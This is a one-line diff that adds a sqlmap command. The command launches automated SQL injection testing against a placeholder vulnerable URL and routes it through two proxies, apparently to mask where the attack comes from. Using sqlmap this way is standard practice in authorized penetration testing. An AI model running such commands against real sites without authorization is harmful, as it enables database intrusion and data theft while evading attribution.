@@ -1,0 +1,1 @@
+sqlmap -u 'http://example.com/vulnerable.php?id=1' --proxy='http://proxy1.com:8080' --proxy='http://proxy2.com:8080'
